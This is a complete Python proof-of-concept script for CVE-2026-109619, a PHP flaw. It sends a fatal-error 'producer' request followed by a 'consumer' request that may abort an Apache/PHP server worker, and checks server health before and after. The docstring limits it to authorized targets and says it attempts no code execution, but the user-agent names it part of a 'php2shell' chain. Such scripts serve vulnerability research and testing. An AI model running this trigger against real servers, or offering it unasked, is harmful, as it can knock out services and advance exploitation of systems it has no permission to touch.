#!/usr/bin/env python3
"""Two-request trigger harness for CVE-2026-109619.

The producer deliberately raises a fatal error with fatal_error_backtraces
enabled. The next request applies an Apache per-directory PHP setting that
emits an early diagnostic before normal PHP request initialization. This is a
trigger harness only; it does not shape the heap or attempt code execution.

Target: any online URL you own or are explicitly authorized to test, e.g.:

    python3 trigger_cve_2026_109619.py --url https://target.com/ \
        --health-path /control/health.php --marker "HEALTHY 8.5.4"

WARNING: the consumer request may abort one server worker (DoS-class probe).
Use it only against authorized targets and do not run it in a loop.
"""

from __future__ import annotations

import argparse
import http.client
import ssl
import sys
import time
from urllib.parse import urlsplit


def open_connection(scheme, hostname, port, timeout, insecure):
    if scheme == "https":
        context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        return http.client.HTTPSConnection(
            hostname, port or 443, timeout=timeout, context=context
        )
    return http.client.HTTPConnection(hostname, port or 80, timeout=timeout)


def request(target, path: str):
    scheme, hostname, port, timeout, base, insecure = target
    conn = open_connection(scheme, hostname, port, timeout, insecure)
    conn.request("GET", path, headers={
        "Host": f"{hostname}:{port}" if port else hostname,
        "User-Agent": "php2shell-poc-trigger/1.0",
        "Connection": "close",
    })
    response = conn.getresponse()
    result = (
        response.status,
        response.getheader("X-Lab-Worker-Pid"),
        response.read(4096).decode("latin1", "replace"),
    )
    conn.close()
    return result


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--url", required=True, help="Online target URL, e.g. https://target.com/")
    parser.add_argument("--health-path", default="/control/health.php",
                        help="Health endpoint used for baseline and follow-up checks")
    parser.add_argument("--producer-path", default="/producer/fatal.php",
                        help="Fatal-error producer endpoint (lab layout)")
    parser.add_argument("--consumer-path", default="/consumer/index.php",
                        help="Early-diagnostic consumer endpoint (lab layout)")
    parser.add_argument("--marker", default="",
                        help="Expected substring in the health response; if set and "
                             "absent, the script aborts before sending any trigger")
    parser.add_argument("--insecure", action="store_true",
                        help="Skip TLS certificate verification (self-signed targets)")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    parsed = urlsplit(args.url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise SystemExit("Provide an absolute http(s) target URL, e.g. https://target.com/")
    base = parsed.path.rstrip("/")
    target = (parsed.scheme, parsed.hostname, parsed.port, args.timeout, base, args.insecure)

    status, pid, body = request(target, base + args.health_path)
    if args.marker and args.marker not in body:
        raise SystemExit(
            f"Baseline health did not contain {args.marker!r} (HTTP {status}); "
            "wrong host? pass a different --marker or --health-path"
        )
    print(f"Baseline: HTTP {status}; worker PID={pid}; {body.strip()[:200]!r}")

    status, pid, body = request(target, base + args.producer_path)
    print(
        f"Producer request: HTTP {status}; worker PID={pid}; "
        f"fatal marker present={'LOCAL_CVE_109619_PRODUCER_FATAL' in body}"
    )

    try:
        status, pid, body = request(target, base + args.consumer_path)
        print(f"Consumer request: HTTP {status}; worker PID={pid}; {body[:240]!r}")
    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        print(f"Consumer request disconnected: {type(exc).__name__}: {exc}")

    time.sleep(0.5)
    try:
        status, pid, body = request(target, base + args.health_path)
        print(f"Follow-up health: HTTP {status}; worker PID={pid}; {body.strip()[:200]!r}")
    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        print(f"Follow-up health failed: {type(exc).__name__}: {exc}")
    print("Scope: stale-state producer/consumer trigger only; no RCE attempt.")


if __name__ == "__main__":
    main()
